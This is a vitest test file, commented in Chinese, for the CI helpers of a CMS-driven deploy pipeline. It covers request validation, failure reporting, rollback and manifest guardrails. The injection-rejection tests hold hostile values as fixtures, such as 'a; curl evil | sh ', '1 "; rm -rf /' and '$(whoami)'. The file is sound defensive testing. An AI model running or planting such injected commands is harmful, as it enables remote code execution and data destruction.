import { describe, expect, it } from 'vitest';
import { buildCallback, describeFailure, parseRequest, prevManifestDecision, requestIdFrom, sourceGate, STEPS } from './ci';

const good = { requestId: 'abcdefghij0123456789ab', kind: 'publish', collection: 'tales', docId: '12', versionId: '34', attempt: 1 };

describe('parseRequest：外來輸入逐欄驗格式', () => {
  it('合格', () => expect(parseRequest(good)).toEqual({ id: good.requestId, kind: 'publish', collection: 'tales', docId: '12', versionId: '34', attempt: 1 }));
  it.each([0, 10, 1.5, '1; rm', undefined])('attempt %j → 拒絕', (attempt) => expect(() => parseRequest({ ...good, attempt })).toThrow(/attempt/));
  it('數字 id 也收（Payload 的 id 是數字）', () => expect(parseRequest({ ...good, docId: 12, versionId: 34 }).docId).toBe('12'));
  it.each([
    ['requestId 有分號', { requestId: 'a; curl evil | sh ' }],
    ['requestId 太短', { requestId: 'abc' }],
    ['kind 不在清單', { kind: 'nuke' }],
    ['集合不在清單', { collection: 'users' }],
    ['docId 有空白與引號', { docId: '1 "; rm -rf /' }],
    ['docId 有 $()', { docId: '$(whoami)' }],
    ['versionId 有換行', { versionId: '1\n2' }],
    ['發佈沒有版本', { versionId: 'none' }],
  ])('拒絕：%s', (_n, patch) => expect(() => parseRequest({ ...good, ...patch })).toThrow());
  it('撤下可以沒有版本', () => expect(parseRequest({ ...good, kind: 'unpublish', versionId: 'none' }).versionId).toBe('none'));
  it.each([null, undefined, 'x', 3])('不是物件 %j → 拒絕', (v) => expect(() => parseRequest(v)).toThrow());
});

describe('describeFailure', () => {
  const log = (m: Record<string, string>) => (id: string) => m[id] ?? '';
  it('回傳第一個失敗的步驟，後面被略過的不算', () => {
    const f = describeFailure({ request: { outcome: 'success' }, 'verify-og-crop': { outcome: 'failure' }, 'verify-docs': { outcome: 'skipped' } },
      log({ 'verify-og-crop': 'og 置中裁切：檢查 21 張\n✗ 1 張被裁掉：tales/2026/x.png\n' }));
    expect(f?.check).toBe('verify-og-crop');
    expect(f?.summary).toContain('✗ 1 張被裁掉');
  });
  it('沒有失敗 → null', () => expect(describeFailure({ deploy: { outcome: 'success' } }, log({}))).toBeNull());
  it('步驟順序：同時有兩個失敗，先發生的那個', () => {
    expect(describeFailure({ 'verify-links': { outcome: 'failure' }, 'verify-fonts': { outcome: 'failure' } }, log({}))?.check).toBe('verify-fonts');
  });
  it('沒有 log 也不會丟錯', () => expect(describeFailure({ fonts: { outcome: 'failure' } }, log({}))?.summary).toMatch(/沒有 log/));
  it('摘要有長度上限', () => {
    expect(describeFailure({ fonts: { outcome: 'failure' } }, log({ fonts: '✗ ' + 'x'.repeat(5000) }))!.summary.length).toBeLessThanOrEqual(1500);
  });
  it('每個 STEPS 都是唯一的', () => expect(new Set(STEPS).size).toBe(STEPS.length));
});

describe('buildCallback：沒有正面證據就不能宣告成功', () => {
  const args = { requestId: good.requestId, readLog: () => '', runUrl: 'https://github.com/o/r/actions/runs/1', promoteKeys: ['video/a/1080p.mp4'], revoked: [] as string[] };
  it('deploy 與 smoke 都成功 → ok，附上 promote 清單', () => {
    expect(buildCallback({ ...args, steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'success' } } })).toMatchObject({ ok: true, promoteKeys: ['video/a/1080p.mp4'] });
  });
  it('smoke 失敗 → 失敗，且指向 smoke', () => {
    expect(buildCallback({ ...args, steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'failure' } } })).toMatchObject({ ok: false, check: 'smoke' });
  });
  it('deploy 被略過（上游失敗）→ 失敗，不是成功', () => {
    expect(buildCallback({ ...args, steps: { 'verify-docs': { outcome: 'failure' }, deploy: { outcome: 'skipped' }, smoke: { outcome: 'skipped' } } })).toMatchObject({ ok: false, check: 'verify-docs' });
  });
  it('什麼步驟都沒有紀錄（workflow 提早結束）→ 失敗（incomplete）', () => {
    expect(buildCallback({ ...args, steps: {} })).toMatchObject({ ok: false, check: 'incomplete' });
  });
  it('失敗的回呼也帶上這次實際搬到公開端的 key：沒記下來的 key 之後撤不掉', () => {
    expect(buildCallback({ ...args, steps: { smoke: { outcome: 'failure' } } })).toMatchObject({ ok: false, promoteKeys: ['video/a/1080p.mp4'] });
  });
  it('smoke 失敗而回滾也失敗 → 指向 rollback（線上可能是壞的版本，不能說「維持上一版」）', () => {
    expect(buildCallback({ ...args, steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'failure' }, rollback: { outcome: 'failure' } } }))
      .toMatchObject({ ok: false, check: 'rollback' });
  });
  it('部署後被取消、回滾成功 → 失敗但不是 rollback', () => {
    expect(buildCallback({ ...args, steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'cancelled' }, rollback: { outcome: 'success' } } }))
      .toMatchObject({ ok: false, check: 'smoke' });
  });
  it('撤回中止的原因會帶給後台（要通知本人）', () => {
    expect(buildCallback({ ...args, revokeAborted: '要撤回 9 個，超過上限 4', steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'success' } } }))
      .toMatchObject({ ok: true, revokeAborted: '要撤回 9 個，超過上限 4' });
  });
});

import { currentVersionId } from './ci';
describe('currentVersionId（回滾目標）', () => {
  const dep = (id: string, at: string, versions: object[]) => ({ id, created_on: at, versions });
  it('取最新一筆的單一版本', () => {
    expect(currentVersionId([
      dep('1', '2026-09-23T17:00:00Z', [{ version_id: 'old', percentage: 100 }]),
      dep('2', '2026-09-23T20:00:00Z', [{ version_id: 'new', percentage: 100 }]),
    ])).toBe('new');
  });
  it('不依賴陣列順序，只看時間', () => {
    expect(currentVersionId([
      dep('2', '2026-09-23T20:00:00Z', [{ version_id: 'new', percentage: 100 }]),
      dep('1', '2026-09-23T17:00:00Z', [{ version_id: 'old', percentage: 100 }]),
    ])).toBe('new');
  });
  it('漸進式部署（兩個版本）→ 拒絕自動回滾', () => {
    expect(() => currentVersionId([dep('1', '2026-09-23T17:00:00Z', [{ version_id: 'a', percentage: 50 }, { version_id: 'b', percentage: 50 }])])).toThrow(/漸進式/);
  });
  it.each([[[]], [null], ['x']])('沒有部署紀錄 %j → 拒絕', (v) => expect(() => currentVersionId(v)).toThrow(/沒有任何部署紀錄/));
});

describe('prevManifestDecision：上一次部署的 manifest 是完整性護欄的基準', () => {
  it('200 → 用它', () => expect(prevManifestDecision(200, false)).toBe('use'));
  it('404 而且不是第一次切換 → 拒絕（護欄不能因為拿不到基準就默默關掉）', () =>
    expect(() => prevManifestDecision(404, false)).toThrow(/manifest/));
  it('404 而且明確宣告是第一次 payload 部署 → 沒有基準', () => expect(prevManifestDecision(404, true)).toBe('none'));
  it('其他狀態碼 → 拒絕', () => expect(() => prevManifestDecision(500, true)).toThrow(/500/));
  it('200 時宣告第一次部署 → 拒絕（已經有 payload 版在線上）', () => expect(() => prevManifestDecision(200, true)).toThrow(/第一次/));
});

describe('sourceGate：只有 repo 變數說 payload 時才能用後台內容部署', () => {
  it('payload → 通過', () => expect(() => sourceGate('payload')).not.toThrow());
  it.each(['', 'git', undefined, 'Payload'])('%j → 拒絕', (v) => expect(() => sourceGate(v)).toThrow(/CONTENT_SOURCE/));
});

describe('requestIdFrom：請求本身不合格時，回呼仍要知道是哪一筆，後台才不用等看門狗', () => {
  it('取出合格的 requestId', () => expect(requestIdFrom(JSON.stringify({ ...good, kind: 'nuke' }))).toBe(good.requestId));
  it.each(['', 'null', '{bad', JSON.stringify({ requestId: 'a; rm' })])('%j → null', (raw) => expect(requestIdFrom(raw)).toBeNull());
});

it('STEPS 包含來源把關與 manifest 兩步，排在 fetch-content 之前', () => {
  const i = (s: string) => STEPS.indexOf(s as never);
  expect(i('content-source')).toBeGreaterThan(-1);
  expect(i('prev-manifest')).toBeGreaterThan(i('content-source'));
  expect(i('fetch-content')).toBeGreaterThan(i('prev-manifest'));
});
